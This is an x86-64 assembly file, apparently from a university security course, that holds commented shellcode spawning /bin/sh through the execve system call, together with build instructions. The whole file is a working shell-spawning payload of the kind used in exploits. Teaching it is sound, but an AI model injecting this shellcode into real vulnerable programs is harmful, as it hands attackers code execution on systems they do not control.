# Shellcode for execve("/bin/sh", NULL, NULL);
# 
# (c) Elias Athanasopoulos,  athanasopoulos.elias@ucy.ac.cy
#
# Compile and link (for debugging):
# as shellcode.s -o shellcode.o
# ld shellcode.o -o shellcode 
#
# For the details of the execve() system call in x86-64:
#
# https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit
#
# In short:
#
# Syscall number: 59 (0x3b)
# arg1: %rdi
# arg2: %rsi
# arg3: %rdx

.section .data
.section .text
.globl _start

_start:
    xor     %rax,%rax                   # Zero %rax for null termination of the "/bin/sh" string.
    pushq   %rax       			        # Push \0.
    mov     $0x68732f2f6e69622f, %r9 	# /bin//sh  
    pushq   %r9                         # There is no push that works with immediate values in x86-64; we use %r9.
    mov     %rsp,%rdi                   # Now the %rdi (1st parameter) points to /bin/sh.
    xor     %rsi,%rsi                   # 2nd parameter.
    xor     %rdx,%rdx                   # 3rd parameter.
    mov     $0x3b,%al                   # 0x3b (59 in dec) is execve().
    syscall

